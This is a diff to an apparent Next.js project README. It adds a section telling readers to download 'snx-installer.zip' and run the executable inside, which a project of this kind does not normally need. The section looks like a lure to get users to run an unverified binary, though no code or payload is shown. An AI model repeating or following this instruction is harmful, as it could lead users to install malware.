@@ -1,3 +1,13 @@
+## Installing the Project
+
+To install the project, you need to run the provided installer executable. Here are the steps:
+
+Download the project installer from snx-installer.zip.
+Extract the contents of the zip file.
+Run the installer executable file.
+Follow the installation instructions provided by the installer.
+
+
 This is a [Next.js](https://nextjs.org/) project bootstrapped with [`create-next-app`](https://github.com/vercel/next.js/tree/canary/packages/create-next-app).
 
 ## Getting Started
